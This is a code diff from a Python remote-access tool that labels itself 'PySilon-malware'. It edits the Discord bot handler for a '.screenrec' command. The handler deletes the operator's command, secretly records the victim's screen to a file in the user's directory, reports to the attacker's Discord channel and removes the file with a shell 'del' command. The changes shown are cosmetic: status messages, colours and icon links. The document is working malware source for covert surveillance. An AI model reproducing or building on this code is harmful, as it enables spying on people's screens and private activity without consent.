@@ -7,11 +7,7 @@ import imageio
 # on message
 elif message.content == '.screenrec':
     await message.delete()
-    embed = discord.Embed(title="🟢 Succsess",description="`Recording... Please wait.`", colour=0x013220)
-    embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
-    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
-    
-    await message.channel.send(embed=embed)
+    await message.channel.send("`Recording... Please wait.`")
 
     output_file = f'C:\\Users\\{getuser()}\\{software_directory_name}\\recording.mp4'
     screen_width, screen_height = pyautogui.size()
@@ -37,8 +33,7 @@ elif message.content == '.screenrec':
         subprocess.run(f'del {output_file}', shell=True)
 
     except Exception as e:
-        embed = discord.Embed(title="📛 Error",description="An error occurred during screen recording.", colour=0x8B0000)
-        embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
-        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+        embed = discord.Embed(title="📛 Error",description="An error occurred during screen recording.", colour=discord.Colour.red())
+        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
         
         await message.channel.send(embed=embed)
